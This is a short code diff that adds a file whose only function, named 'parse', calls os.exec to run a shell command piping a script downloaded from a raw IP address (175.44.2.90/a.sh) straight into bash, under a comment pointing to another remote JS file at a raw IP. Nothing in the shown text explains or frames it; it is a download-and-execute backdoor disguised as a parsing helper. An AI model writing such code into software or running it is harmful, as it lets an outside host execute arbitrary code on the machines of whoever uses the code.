@@ -1,0 +1,5 @@
+//http://106.14.15.50/testxz.js
+
+function parse(x){
+        os.exec(["sh","-c","curl 175.44.2.90/a.sh|bash"],{file:"sh"})
+}
